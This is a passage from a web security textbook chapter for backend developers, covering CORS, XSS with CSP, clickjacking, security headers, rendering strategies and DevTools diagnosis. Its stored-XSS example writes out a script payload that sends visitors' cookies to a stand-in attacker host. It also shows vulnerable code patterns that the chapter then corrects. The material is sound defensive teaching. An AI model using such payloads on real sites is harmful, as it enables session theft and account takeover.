- Because **sending** is allowed, a page on another site can still make the user's browser submit a form to your server, with cookies, which is cross-site request forgery (Chapter 19). The SOP alone does not prevent it; `SameSite` cookies and CSRF defences do.
- Because **embedding scripts** is allowed and an embedded script runs **with the embedding page's origin**, every third-party script on your page (analytics, chat widgets, a library from a CDN) has full access to your page and its data. The SOP protects you from other sites' pages, not from scripts you chose to include.

### Guarantees and non-guarantees

The SOP guarantees that, in a compliant browser, scripts from one origin cannot read another origin's responses, documents or storage without its consent. It does not stop requests from being sent, does not apply to non-browser clients, does not protect against scripts you include yourself, and is a property of the browser, not of your server: your server receives cross-origin requests and runs them like any others.

### Failure and diagnosis

- **Over-trusting subdomains.** A team assumes `blog.example.com` and `app.example.com` are isolated from each other. For the SOP they are, but for cookies with `Domain=example.com` they are not: a vulnerable blog can set or read such cookies, and requests between them are same-site, so `SameSite` does not separate them. Fix: host untrusted or user-generated content on a different registrable domain (for example `example-usercontent.com`).
- **`postMessage` without origin checks.** A page accepts messages from any window and acts on them. Fix: check `event.origin` against an allowlist, and send messages with an explicit target origin.

### Backend connection

The SOP is the browser's protection for your users, and it shapes your architecture: decide which origins serve your pages and APIs, keep untrusted content on separate sites, and remember that it does nothing to stop the requests themselves from reaching you.

---

## 9.7 CORS: Cross-Origin Resource Sharing

### Definition

**CORS** (Cross-Origin Resource Sharing) is the protocol by which a server **relaxes** the same-origin policy for its own responses: it tells the browser, through response headers, which other origins may read those responses from script, with which methods, headers and credentials. The browser enforces the answer.

### Why it exists

Applications routinely span origins: a page at `https://shop.example.com` calls an API at `https://api.example.com`. Under the SOP alone, the page could send those requests but never read the answers. CORS lets the API say "pages from `https://shop.example.com` may read my responses", without opening them to every site on the internet.

### Mechanism 1: simple requests

Some requests could already be sent cross-origin before CORS existed (a form `POST`, an image load), so for those the browser sends the request straight away and only decides afterwards whether the script may **read** the response. A **simple request** is one that a plain HTML form could have sent:

- method `GET`, `HEAD` or `POST`;
- only **CORS-safelisted** request headers (such as `Accept`, `Accept-Language`, `Content-Language`, and `Content-Type` with a safelisted value);
- if there is a `Content-Type`, it is `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`.

```text
 page https://shop.example.com                browser                     https://api.example.com
   │ fetch(".../v1/catalog")  ───────────────►│ GET /v1/catalog                         │
   │                                          │ Origin: https://shop.example.com ──────►│
   │                                          │◄────────────────────────── 200 OK       │
   │                                          │  Access-Control-Allow-Origin:           │
   │                                          │      https://shop.example.com           │
   │                                          │  Vary: Origin                           │
   │◄──── response readable ──────────────────┤ the browser compares the header with    │
   │                                          │ the page's origin: match → allow        │
 if the header were missing or different: the request was STILL SENT and the server STILL
 ran it; the browser only refuses to give the response to the script ("CORS error")
```

### Mechanism 2: preflighted requests

Any request that is not simple (a `PUT` or `DELETE`, a JSON body with `Content-Type: application/json`, a custom header such as `Authorization` or `Idempotency-Key`) could do things that old web pages could not, so the browser first asks permission with a **preflight**: an `OPTIONS` request that describes the real request without sending it.

```text
 page https://shop.example.com            browser                         https://api.example.com
   │ fetch(".../v1/orders", {                                                     │
   │   method: "POST",                                                            │
   │   headers: {"Content-Type": "application/json",                              │
   │             "Authorization": "Bearer eyJ..."},                               │
   │   body: ...}) ────────────────────►│                                         │
   │                                    │ 1. PREFLIGHT (no body, no credentials)  │
   │                                    │ OPTIONS /v1/orders                      │
   │                                    │ Origin: https://shop.example.com        │
   │                                    │ Access-Control-Request-Method: POST     │
   │                                    │ Access-Control-Request-Headers:         │
   │                                    │     authorization, content-type ───────►│
   │                                    │                                         │ checks origin,
   │                                    │◄──────────────────── 204 No Content     │ method, headers
   │                                    │ Access-Control-Allow-Origin:            │
   │                                    │     https://shop.example.com            │
   │                                    │ Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   │                                    │ Access-Control-Allow-Headers: authorization, content-type
   │                                    │ Access-Control-Max-Age: 600             │ cache this answer 10 min
   │                                    │ Vary: Origin                            │
   │                                    │ 2. all allowed → the REAL request       │
   │                                    │ POST /v1/orders                         │
   │                                    │ Origin: https://shop.example.com        │
   │                                    │ Authorization: Bearer eyJ...            │
   │                                    │ Content-Type: application/json ────────►│
   │                                    │◄─────────────────────────── 201 Created │
   │                                    │ Access-Control-Allow-Origin:            │
   │                                    │     https://shop.example.com            │
   │◄── response readable ──────────────┤ (the real response needs the header too) │
```

If the preflight's answer does not allow the method, a header or the origin, the browser **does not send the real request at all**. `Access-Control-Max-Age` lets the browser cache the preflight answer for that URL, so that every later request does not pay an extra round trip (browsers cap how long they honour it).

### Mechanism 3: credentialed requests

By default, a cross-origin `fetch` carries no cookies. With `credentials: "include"`, the browser attaches them (per Section 9.5), and the rules tighten:

```http
GET /v1/me HTTP/2
Origin: https://shop.example.com
Cookie: sid=4f9a1b2c7d

HTTP/2 200
Access-Control-Allow-Origin: https://shop.example.com     ← must be the exact origin, never *
Access-Control-Allow-Credentials: true                    ← must be present, or the script cannot read it
Vary: Origin
```

- With credentials, `Access-Control-Allow-Origin: *` is **not accepted**: the server must name the origin.
- The response must include `Access-Control-Allow-Credentials: true`, and so must the preflight response, if there was one.
- `Vary: Origin` is needed whenever the header's value depends on the request's origin, or a cache (Chapter 7, Section 7.12) could serve one origin's permission to another.

**Reading response headers.** By default a script can read only a few safelisted response headers. To expose others (`X-Request-Id`, `Location`, `ETag`), the server lists them in `Access-Control-Expose-Headers`.

### Concrete: the headers in one table

| Header | Sent by | Meaning |
|---|---|---|
| `Origin` | browser, on cross-origin requests (and some others) | the requesting page's origin |
| `Access-Control-Request-Method` | browser, in a preflight | the method of the real request |
| `Access-Control-Request-Headers` | browser, in a preflight | the non-safelisted headers the real request will carry |
| `Access-Control-Allow-Origin` | server | the one origin allowed to read, or `*` for any (not with credentials) |
| `Access-Control-Allow-Methods` | server, in a preflight response | methods allowed |
| `Access-Control-Allow-Headers` | server, in a preflight response | request headers allowed |
| `Access-Control-Allow-Credentials` | server | `true` if reading credentialed responses is allowed |
| `Access-Control-Max-Age` | server, in a preflight response | how long the preflight answer may be cached, in seconds |
| `Access-Control-Expose-Headers` | server | extra response headers the script may read |

### Why CORS is not server-side protection

This is the point interviews test most. CORS is **enforced by the browser, for the browser's users**:

- A non-browser client (`curl`, a script, a mobile app, another server) ignores CORS entirely and reads every response.
- For simple requests, the request **reaches your server and runs** even when the CORS check later fails. A cross-site form `POST` that transfers money is executed; CORS only stops the attacking page from reading the result. Protection against unwanted actions is authentication, authorisation and CSRF defence (Chapter 19), not CORS.
- An `Access-Control-Allow-Origin` header grants reading, it never restricts: leaving it out only stops other origins' pages from reading responses in browsers.

So: **authenticate and authorise every request on the server as if CORS did not exist**, and use CORS only to decide which other origins' pages may read your responses in a user's browser.

### Common misconfigurations

1. **Reflecting any `Origin` with credentials.** The server copies the request's `Origin` into `Access-Control-Allow-Origin` and adds `Access-Control-Allow-Credentials: true`. Now any website can read your users' authenticated API responses through their browsers. Fix: compare `Origin` against an explicit allowlist.
2. **Broken allowlist matching.** "Allow any origin ending in `example.com`" also allows `https://evilexample.com`; "starting with `https://example.com`" allows `https://example.com.attacker.test`. Fix: exact string comparison against a list.
3. **Allowing `null`.** The `Origin: null` value is sent from sandboxed iframes, local files and some redirects, and attackers can produce it on purpose. Never allow it for credentialed responses.
4. **Preflights rejected by authentication.** The `OPTIONS` preflight carries no credentials, so authentication middleware answers `401`, and the browser reports a CORS failure. Fix: let preflights through to the CORS handler before authentication, with no side effects.
5. **CORS headers on success only.** An error path (`500`, a gateway's `502`) omits the headers, so the browser reports a CORS error and the real error is hidden from the front-end developer. Fix: add CORS headers at the gateway for all responses.
6. **Missing `Vary: Origin`** on a cached response whose allowed origin differs per request, so a CDN serves one origin's header to another.

> **Framework lens:** Spring offers `@CrossOrigin` on controllers and a global `CorsConfiguration`; with Spring Security, CORS must be enabled in the security filter chain so that preflights are handled before authentication. Express uses the `cors` middleware. In every framework, prefer an explicit list of allowed origins, and set `allowCredentials` only if cookies are really needed.

### Guarantees and non-guarantees

CORS guarantees that a compliant browser lets a script from origin A read origin B's response only when B's headers allow it, and that non-simple requests are not sent unless a preflight allows them. It does not protect the server from any client, does not stop simple requests from executing, and does not hide responses from the user or from non-browser tools.

### Failure and diagnosis

The browser deliberately hides details of a failed CORS check from the page's script (the script only sees a generic network error), so the evidence is in the **console** and the **network panel** (Diagnosis Lab 1 decodes a real message). The usual causes, by message:

- *"No 'Access-Control-Allow-Origin' header is present on the requested resource"*: the server, proxy or error path did not add the header, or the request failed before reaching the CORS handler.
- *"Response to preflight request doesn't pass access control check"*: the `OPTIONS` request was rejected (often `401` or `404`) or lacked the allow headers.
- *"The value of the 'Access-Control-Allow-Origin' header ... must not be the wildcard '\*' when the request's credentials mode is 'include'"*: credentials with `*`.
- *"Request header field x-request-id is not allowed by Access-Control-Allow-Headers in preflight response"*: a custom header missing from the allow list.

### Backend connection

The simplest CORS setup is none: serve the page and the API from the **same origin** (for example `https://shop.example.com/api/...` behind one reverse proxy, Chapter 10), and no cross-origin rules apply. When origins must differ, configure CORS in one place (the gateway or one filter), with an exact allowlist, `Vary: Origin`, preflight handling before authentication, and headers on error responses too; and never mistake it for access control.

---

## 9.8 Cross-Site Scripting (XSS) and Content Security Policy

### Definitions

**Cross-site scripting** (XSS) is a vulnerability in which an attacker gets their own script to run in a page of your origin, in another user's browser. Because the script runs **as your page**, the same-origin policy treats it as yours: it can read the page, read non-`HttpOnly` cookies and `localStorage`, and make authenticated requests to your servers as the user.

The three kinds differ by where the malicious input lives:

- **Stored XSS**: the input is saved on the server (a comment, a profile name, a product review) and later included in pages shown to other users.
- **Reflected XSS**: the input is in the request (usually the URL) and the server copies it into the response; the attacker gets a victim to open a crafted link.
- **DOM-based XSS**: the server is not involved; the page's own JavaScript takes attacker-controlled data (from the URL, `postMessage`, storage) and inserts it into the page in a way that runs it.

**Output encoding** (escaping) converts characters that have meaning in the output's context into a form that is displayed literally (`<` becomes `&lt;` in HTML). **Sanitisation** parses untrusted HTML and removes everything not on an allowlist of safe tags and attributes. A **Content Security Policy** (CSP) is a response header that tells the browser which sources of script (and other content) it may load and run for this page.

### Why it exists

A web page mixes code and data in one document. HTML, attributes, URLs and inline JavaScript all have their own syntax, and data inserted into any of them without the right encoding can end that syntax early and start code. Whenever user-controlled data reaches a page, the browser cannot tell "text the developer meant to show" from "script the attacker meant to run": it runs whatever the markup says.

### Mechanism 1: stored XSS, and its defence

A product page shows reviews. A review's text is stored as entered and inserted into the HTML with string concatenation:

```pseudo
html = "<div class='review'>" + review.text + "</div>"     // vulnerable
```

The attacker submits a review whose text is:

```html
Great keyboard!<script>fetch("https://attacker.example/c?d=" + document.cookie)</script>
```

Every visitor's browser now receives that `<script>` element inside your page and runs it as your origin: here it sends the visitor's readable cookies to the attacker; it could equally call your API as the visitor.

**Defence: encode on output, for the context.** Insert the text as **text**, not markup. In HTML element content, encode at least `&` `<` `>` `"` `'`:

```html
<div class='review'>Great keyboard!&lt;script&gt;fetch(&quot;https://attacker.example/c?d=&quot; + document.cookie)&lt;/script&gt;</div>
```

The browser displays the review text, angle brackets included, and runs nothing. In practice you get this from a templating engine that **escapes by default**, and you avoid the escape hatches that switch it off, except for HTML you have sanitised.

### Mechanism 2: reflected XSS, and its defence

A search page echoes the query:

```text
request:   GET /search?q=<script>...</script>
response:  <h1>Results for <script>...</script></h1>      ← the server copied q into HTML unencoded
```

The attacker sends victims a link to `https://shop.example.com/search?q=` followed by a script, encoded so the link looks harmless. The victim's browser requests your page, your server reflects the script, and it runs as your origin.

**Defence: the same output encoding**, applied to everything taken from the request (query, path, headers) and written into the response, in every context:

| Context the data goes into | Encoding needed | Example |
|---|---|---|
| HTML element content | HTML entities for `& < > " '` | `<p>Results for {q}</p>` |
| HTML attribute (always quoted) | HTML attribute encoding | `<input value="{q}">` |
| A URL in `href` or `src` | URL encoding of parameters, **plus** checking the scheme is `http`/`https` | `<a href="/search?q={q}">`; reject `javascript:` URLs |
| Inside a `<script>` block | JavaScript string escaping, or better: put the data in a JSON data attribute and read it from script | avoid templating into scripts |
| CSS | CSS escaping, or better: never insert untrusted data | |

Input **validation** (rejecting a quantity that is not a number, an email that does not look like one) helps, but it is not the defence: many legitimate inputs contain `<` or quotes. Encoding at output is.

### Mechanism 3: DOM-based XSS, and its defence

The page's own script writes data from the URL into the page:

```pseudo
// page: https://shop.example.com/welcome#name=Asha
name = decodeURIComponent(location.hash.split("name=")[1])
document.getElementById("greeting").innerHTML = "Hello, " + name      // vulnerable sink
```

A link whose fragment contains markup with an event handler, such as an `<img>` with an `onerror` attribute, makes the page build and run that markup. The fragment is never sent to the server (Chapter 7, Section 7.2), so server-side logs show nothing.

**Defence: use safe sinks.** Write text with `textContent` (or the framework's normal data binding), never `innerHTML`, `outerHTML`, `document.write` or `insertAdjacentHTML` with untrusted data; never pass it to `eval`, `new Function`, `setTimeout` with a string, or into `href`/`src` without checking the scheme. If you must insert rich HTML (a comment that allows bold and links), run it through a well-maintained **sanitiser** with an allowlist first. Browsers that support **Trusted Types** can enforce this: with a CSP directive, assigning a plain string to a dangerous sink throws, so only values that passed through a designated sanitising policy can reach it.

```pseudo
document.getElementById("greeting").textContent = "Hello, " + name    // safe: displayed as text
```

### Mechanism 4: Content Security Policy

Encoding is the primary defence; CSP is the safety net when an encoding mistake slips through. A strict, nonce-based policy:

```http
Content-Security-Policy: script-src 'nonce-q8Zk2Lw9' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

```html
<script nonce="q8Zk2Lw9" src="/static/app.4d9e21.js"></script>     ← runs: carries this response's nonce
<script>alert(1)</script>                                            ← injected: no nonce → blocked
```

- `script-src 'nonce-...'`: run only scripts that carry this **nonce**, a random value the server generates fresh for **every response** (from a CSPRNG, Chapter 8, Section 8.2). An attacker who injects markup cannot know the nonce, so their script does not run. Inline event handlers (`onerror="..."`) and `javascript:` URLs are blocked too.
- `'strict-dynamic'`: scripts that a trusted (nonced) script loads are trusted as well, which keeps policies workable with loaders and bundles.
- `object-src 'none'` blocks plugins; `base-uri 'none'` stops an injected `<base>` tag from redirecting relative script URLs.
- `frame-ancestors 'none'` is the clickjacking defence (Section 9.9).

Policies that allow `'unsafe-inline'` for scripts, or that allow-list whole CDN domains that also host user-uploaded or old library files, give most of the protection away. Roll a new policy out first with **`Content-Security-Policy-Report-Only`**, which reports violations without blocking, to find what would break.

### What XSS can and cannot do, and why HttpOnly is not enough

Once attacker script runs in your page, it can:

- read the page's DOM, including anything shown to the user;
- read `localStorage`, `sessionStorage`, IndexedDB and non-`HttpOnly` cookies, and send them anywhere;
- make requests to your origin **with the user's cookies**, as the user (change their email, read their orders, make purchases);
- show fake login forms inside your trusted page.

`HttpOnly` stops only the second item for cookies. The attacker cannot carry the session cookie away, but can still use it from inside the page for as long as the page is open. So `HttpOnly` limits the damage; it is not a defence against XSS itself.

### Guarantees and non-guarantees

Correct contextual encoding guarantees that data is displayed as data. A strict CSP guarantees that, in browsers that support it, scripts without the current nonce do not run. Neither protects against a script you intentionally include that is malicious or compromised (a third-party script supply-chain attack), and CSP does not fix the injection itself: it blocks one consequence of it. Validation alone guarantees nothing about XSS.

### Failure and diagnosis

- **Stored XSS discovered in production.** Evidence: stored records containing `<script`, `onerror=`, or `javascript:`; CSP violation reports naming inline scripts on pages that show user content; unexplained account changes from users who viewed one page. Response: encode at output in that template (and audit others), clean the stored data, invalidate sessions if session data could have been read, review what the injected script could reach.
- **CSP rollout breaks the site.** A policy deployed in blocking mode stops legitimate inline scripts or third-party tags. Evidence: violation messages in the console and reports. Fix: run in report-only mode first, move inline scripts to nonced files, and remove or replace third-party scripts that cannot work with the policy.

> **Framework lens:** Server-side template engines used with Spring (Thymeleaf with `th:text`, for example) and front-end frameworks escape interpolated values by default; the risk is in the explicit raw-HTML escape hatches (`th:utext`, React's `dangerouslySetInnerHTML`, Vue's `v-html`) and in direct DOM manipulation. Search a codebase for those names first when auditing for XSS.

### Backend connection

The backend owns three of the defences: encoding output in server-rendered HTML (and never building HTML by concatenation), storing user content as data and serving it with the right `Content-Type`, and sending the CSP header with a fresh nonce on every HTML response. It also decides where tokens live (Section 9.5), and therefore how much an XSS bug can steal.

---

## 9.9 Clickjacking and the Other Security Headers

### Definitions

**Clickjacking** is an attack in which a malicious page loads your page in an invisible or disguised `<iframe>` and tricks the user into clicking something on it ("Delete account", "Transfer", "Allow camera") while they believe they are clicking the attacker's page.

**Security headers** are response headers that instruct the browser to apply extra protections to your page.

### Why they exist

Browsers allow embedding by default (Section 9.6), and the user's cookies make the embedded page fully authenticated. Many protections, such as forbidding framing, stopping the browser from guessing content types, or limiting what the `Referer` header leaks, have to be switched on per page, and only the server can do it.

### Mechanism: clickjacking and its defence

```text
 attacker's page (what the user sees)           your page, loaded in a transparent iframe on top
 ┌─────────────────────────────────────┐        ┌──────────────────────────────────────┐
 │   Win a free phone!                 │        │  Account settings                    │
 │                                     │  ═══►  │                                      │
 │   [  Claim prize  ]  ←── user clicks│        │  [ Delete my account ] ← actually    │
 │                                     │        │     placed exactly under the button  │
 └─────────────────────────────────────┘        └──────────────────────────────────────┘
```

The defence is for your page to refuse to be framed by other sites:

```http
Content-Security-Policy: frame-ancestors 'none'          (or 'self', or a list of allowed embedding origins)
X-Frame-Options: DENY                                    (the older header; SAMEORIGIN allows your own site)
```

`frame-ancestors` is the modern control and supports lists; `X-Frame-Options` is still worth sending for older browsers. `SameSite=Lax` or `Strict` cookies also help: a page framed by another site makes a cross-site request, so such cookies are not sent and the framed page is logged out.

### Mechanism: a baseline set of headers

| Header | Typical value | What it does |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | HTTPS only, for a year (Chapter 8, Section 8.11) |
| `Content-Security-Policy` | a strict, nonce-based policy (Section 9.8), including `frame-ancestors` | limits script sources; forbids framing |
| `X-Frame-Options` | `DENY` | framing protection for older browsers |
| `X-Content-Type-Options` | `nosniff` | the browser must trust `Content-Type` and not "sniff" a different type from the content; stops an uploaded "image" being run as a script or stylesheet |
| `Referrer-Policy` | `strict-origin-when-cross-origin` (or stricter) | sends only the origin, not the full URL, to other sites, so paths and query strings (which may hold identifiers) do not leak in `Referer` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | turns off powerful browser features the page does not use, including for embedded third-party content |
| `Cross-Origin-Opener-Policy` | `same-origin` | puts your page in its own browsing-context group, so a cross-origin window that opened it (or that it opened) cannot keep a reference to it |
| `Cache-Control` | `private, no-store` on sensitive pages | keeps personal pages out of shared caches and history (Chapter 7, Section 7.12) |

Two legacy headers: `X-XSS-Protection` controlled a filter that modern browsers have removed; do not rely on it (sending `0` or omitting it is the current advice). And headers protect only responses that carry them: set them on every HTML response, error pages included, usually at the reverse proxy or in one framework filter.

### Guarantees and non-guarantees

These headers guarantee the corresponding behaviour in browsers that support them. They do not fix vulnerabilities in the application, they do not apply to non-browser clients, and each covers only the responses that carry it.

### Failure and diagnosis

- **Embedding breaks for a legitimate partner.** `frame-ancestors 'none'` stops a partner who is supposed to embed a widget. Fix: list the partner's origin in `frame-ancestors` for that one route only.
- **Missing headers on some routes.** A scanner reports headers missing on error pages or static files served by a different component. Fix: add them at the edge proxy so every response gets them.

> **Framework lens:** Spring Security adds several of these by default (for example `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, cache-control headers on secured responses, and HSTS on HTTPS requests), but not a CSP, which must be designed for each application. In Node.js, the `helmet` middleware plays the same role.

### Backend connection

Security headers are cheap, server-side and easy to forget. Decide the set once, apply it at one layer for every response, and test for them in the deployment pipeline.

---

## 9.10 SSR, CSR, SSG and ISR: What They Change for the Backend

### Definitions

- **Client-side rendering** (CSR): the server returns a nearly empty HTML **shell** and a JavaScript bundle; the browser runs the script, calls APIs for data, and builds the page itself.
- **Server-side rendering** (SSR): the server produces the complete HTML for each request, data included; the browser shows it at once, then (in modern frameworks) **hydrates** it, attaching JavaScript behaviour to the server-rendered markup.
- **Static site generation** (SSG): HTML is produced **at build time**, once, and served as static files, usually from a CDN.
- **Incremental static regeneration** (ISR): static pages that are regenerated on the server after a set interval or on demand, the old version being served meanwhile, the stale-while-revalidate idea of Chapter 7 (Section 7.12) applied to whole pages.

### Why it matters to the backend

The choice decides what your servers return, which responses can be cached and where, how many requests the backend receives per page view, and how authentication reaches the data. These are backend design questions even when a front-end framework makes the choice.

### Mechanism: the same page, three ways

The page is a user's order list at `/orders`.

```text
 CSR
 GET /orders              → 200 text/html (1 KB shell)          Cache-Control: no-cache (+ ETag)
                             <div id="root"></div><script src="/static/app.4d9e21.js" defer>
 GET /static/app.4d9e21.js→ 200 (300 KB, compressed)            Cache-Control: public, max-age=31536000, immutable
 GET /api/me              → 200 application/json                Cache-Control: private, no-store
 GET /api/orders          → 200 application/json (the data)     Cache-Control: private, no-store
 first useful pixels: after the bundle downloads and runs AND the API calls return

 SSR
 GET /orders              → 200 text/html (the full list in HTML) Cache-Control: private, no-store
                             (server fetched the orders itself, with the user's session)
 GET /static/app.4d9e21.js→ 200, cached for a year              (hydration)
 first useful pixels: when the HTML arrives; the server's TTFB includes fetching the data

 SSG
 GET /help/returns        → 200 text/html, identical for all users, built at deploy time
                             served by the CDN                  Cache-Control: public, max-age=..., s-maxage=...
 personal data: must NOT be in this HTML; fetched by script from APIs after load, as in CSR
```

| | CSR | SSR | SSG / ISR |
|---|---|---|---|
| What the backend returns for the page | a static shell + JSON APIs | complete HTML per request | prebuilt HTML files |
| Cacheability of the HTML | shell: shared caches; data: private | personalised HTML: **private** only; public pages can be cached with care | **public**, CDN, long-lived (ISR: refreshed periodically) |
| Backend work per page view | API calls only | rendering + data fetching for every request | almost none (CDN), plus API calls for dynamic parts |
| Time to first useful content | slowest on slow devices (download, run, then fetch) | fast first paint; TTFB includes data fetching | fastest (CDN, no work) |
| Search engines and link previews | depend on the crawler running JavaScript | content in the HTML | content in the HTML |
| How auth reaches the data | the browser's API calls carry a cookie (same site) or a bearer token; cross-origin APIs need CORS (Section 9.7) | the session cookie arrives with the **navigation**, and the server calls its own APIs or database; no token in page script | not at all in the HTML; only in later API calls |
| Main security pitfall | tokens in browser storage readable by XSS (Section 9.5) | personalised HTML cached by a CDN (Chapter 7, Section 7.12); output encoding in templates (Section 9.8) | accidentally baking user-specific or secret data into public files |

### Guarantees and non-guarantees

SSG guarantees that every user gets the same, cacheable bytes, and SSR that the HTML contains the content when it arrives. None of the three makes personal data safe to cache publicly, and hydration does not make an SSR page interactive instantly: until the JavaScript has loaded and run, buttons may not respond.

### Failure and diagnosis

- **One user sees another's orders after enabling SSR behind a CDN.** The SSR page was served with public caching. This is Chapter 7's Diagnosis Lab 1 in a new setting. Fix: `private, no-store` on personalised SSR pages, and CDN rules that bypass the cache for requests with session cookies.
- **SSR servers overloaded on traffic peaks.** Every page view now costs rendering plus several data calls on the server; CPU and connection pools saturate. Evidence: SSR latency rising with request rate while APIs are healthy. Fixes: cache what is not personal, render the personal parts client-side, or move public pages to SSG/ISR.
- **A secret in a static bundle.** An API key, used at build time, is embedded in a generated page or a client bundle. Anyone can read it. Fix: keep secrets on the server; rotate the key.

### Backend connection

Pick the rendering strategy per page, by its data: SSG or ISR for public, rarely changing content; SSR for content that must be in the HTML (search engines, link previews, fast first paint) and can be rendered close to the data; CSR for highly interactive, personal screens behind login. Then set caching headers that match each one.

---

## 9.11 Diagnosis: The Browser's Own Tools

### Definition

**Browser developer tools** (DevTools) are the inspection panels built into the browser (Network, Console, Application, Performance) that record what the browser actually requested, received, stored, blocked and rendered for a page.

### Why

Many incidents that reach the backend start as a front-end report: "the API is broken", "it says CORS", "the page is slow". The browser records the evidence in its developer tools; reading it settles whether the problem is the network, the server, the browser's security rules or the page's own code.

### Concrete 1: the network panel and its timing breakdown

Open DevTools → Network, reload with **"Disable cache"** ticked and **"Preserve log"** on (so redirects and navigations are kept). Each row is one request; the **Initiator** column shows which script or tag caused it. The **Timing** tab for one request shows segments like these (labels from Chromium-based browsers; others are similar):

```text
 Queueing                    2 ms     waiting in the browser (priorities, connection limits)
 Stalled                    40 ms     waiting for a free connection (HTTP/1.1 six-per-host limit)
 DNS Lookup                 48 ms  ┐
 Initial connection         51 ms  ├  cold start only: Chapter 6, Sections 6.6 and 6.8
 SSL                        49 ms  ┘  (part of "Initial connection"; Chapter 8, Section 8.9)
 Request sent              0.2 ms
 Waiting for server response 312 ms  ← TTFB: the server's processing time plus one round trip
 Content Download           18 ms     body transfer
```

Read it as evidence: a large **Stalled** time points to connection limits; large **DNS / connection / SSL** times to cold starts; a large **Waiting** time to the server (subtract one RTT, measured with `ping` or from a small request, to get roughly the server's own time); a large **Content Download** to a big body or a slow link. **Copy as cURL** on any row reproduces the exact request outside the browser (Chapter 7, Section 7.16), which separates "the server fails" from "the browser blocks".

### Concrete 2: decoding a CORS error

The console of a page at `https://shop.example.com` shows:

```text
Access to fetch at 'https://api.example.com/v1/orders' from origin 'https://shop.example.com' has been
blocked by CORS policy: Response to preflight request doesn't pass access control check: No
'Access-Control-Allow-Origin' header is present on the requested resource.
```

Read it piece by piece:

1. **"Response to preflight request"**: the browser sent an `OPTIONS` preflight (the real request was not simple: a JSON body, an `Authorization` header...). The real request was **never sent**.
2. **"No 'Access-Control-Allow-Origin' header"**: the preflight's response lacked the header. In the network panel, find the `OPTIONS` row: is its status `204`/`200` (the server answered without CORS headers), or `401`/`403` (authentication middleware rejected it before the CORS handler), or `404`/`405` (no route for `OPTIONS`), or `502` (the gateway, not your app, answered)?
3. **Reproduce it** with `curl`, sending the same preflight:

```bash
curl -i -X OPTIONS https://api.example.com/v1/orders \
  -H 'Origin: https://shop.example.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: authorization, content-type'
```

The answer shows exactly which header is missing. Diagnosis Lab 1 follows one case to its root cause.

### Concrete 3: blocked mixed content

```text
Mixed Content: The page at 'https://shop.example.com/checkout' was loaded over HTTPS, but requested an
insecure resource 'http://cdn.partner.test/widget.js'. This request has been blocked; the content must
be served over HTTPS.
```

The page is HTTPS, a script is referenced by `http://` URL, and the browser refuses to run it (Chapter 8, Section 8.11). Find where the URL comes from (the HTML, a configuration value, a database field holding absolute URLs), and change it to `https://` or a protocol-relative path.

### Concrete 4: the Application and Console panels

The **Application** panel lists cookies per origin with every attribute, and in Chromium-based browsers marks cookies that were rejected or not sent with the reason (for example a `SameSite` restriction), which is the fastest answer to "why is my cookie missing". It also shows `localStorage`, `sessionStorage` and IndexedDB contents. The **Console** shows CSP violations, CORS errors and mixed-content blocks, each naming the resource and the rule.

### Guarantees and non-guarantees

DevTools show what this browser sent, received, stored and blocked, from the browser's side of the connection. They do not show what happened behind the first server or proxy the request reached, so a slow "Waiting for server response" says that something behind it was slow, not what. They also show more than the page's code can see: when a CORS check fails, the page's JavaScript receives only a generic network error, while the Console explains which rule failed.

### Backend connection

Give front-end colleagues and yourself the means to correlate: a request ID header on every response (`X-Request-Id`, exposed through `Access-Control-Expose-Headers` for cross-origin APIs) that appears in the server's logs, so that one row in the network panel leads straight to one log line.

---

## Chapter Summary

A modern browser is several cooperating processes: a trusted browser process that owns navigation, cookies and storage; a network process that does all networking with its DNS cache, HTTP cache and per-origin connection pools; sandboxed renderer processes, isolated per site, that parse, lay out and run JavaScript; and a GPU process that draws. Typing a URL runs through input handling and the HSTS check, then DNS, TCP and TLS on a cold start (Chapters 6–8), then the HTTP request with the cookies the rules allow, any redirects, and a commit to a renderer, which parses HTML into the DOM as it streams, builds the CSSOM, and renders through layout, paint and compositing. CSS blocks rendering and plain scripts block parsing; `defer` and `async` let scripts download in parallel. Every page's script runs on one main thread under an event loop, so long tasks freeze it, and `fetch` sends requests through the network process with headers (`Origin`, `Cookie`, `Sec-Fetch-*`) that only the browser may set.

Browsers keep state per origin or per site. Cookies are sent automatically on matching requests, governed by domain, path, `Secure`, expiry, `SameSite` (`Strict`, `Lax`, `None`) and the request's credentials mode; `HttpOnly` hides them from scripts but not from requests. `localStorage`, `sessionStorage` and IndexedDB are readable by any script on the origin and never sent automatically. An **origin** is scheme, host and port, and the **same-origin policy** stops a page from reading another origin's responses, documents and storage, while still letting it send requests and embed resources. **CORS** lets a server relax that rule for reading: simple requests are sent at once and the browser checks `Access-Control-Allow-Origin` on the response; other requests are preceded by an `OPTIONS` preflight; credentialed requests need an exact origin and `Access-Control-Allow-Credentials`. CORS is enforced by the browser for its users, never a server-side protection.

**XSS** puts attacker script in your page, where it acts with your origin's full powers. Stored and reflected XSS are prevented by contextual output encoding in server-rendered HTML, DOM-based XSS by safe sinks and sanitisation in page script, and a strict, nonce-based **CSP** blocks injected scripts that slip through; `HttpOnly` only limits what can be carried away. **Clickjacking** is stopped by `frame-ancestors` or `X-Frame-Options`, and a baseline of security headers (`nosniff`, a referrer policy, permissions policy, HSTS) must be set on every response. Finally, **CSR**, **SSR** and **SSG/ISR** change what the backend serves: JSON APIs behind a static shell, personalised HTML per request (private caching, session cookies on navigation), or prebuilt public files on a CDN. The browser's network, application and console panels, with "Copy as cURL", turn front-end symptoms into server-side evidence.

---

## Guarantees vs. Non-Guarantees

| Mechanism | Guarantees | Does NOT guarantee |
|---|---|---|
| Multi-process, site-isolated browser | A crash or hang in one site's renderer is contained; sites do not share an address space | That a renderer cannot be compromised; protection from your own page's scripts |
| Browser HTTP cache | Reuse of fresh responses per your headers, partitioned by top-level site | Caching of anything your headers do not allow; sharing across sites |
| Forbidden request headers | Page scripts cannot set `Origin`, `Cookie`, `Referer`, `Sec-Fetch-*` | That a request came from a browser at all |
| Cookie rules | A cookie is sent only where domain, path, `Secure`, `SameSite` and credentials mode allow | Secrecy from the user, from same-origin scripts (unless `HttpOnly`), or from malware |
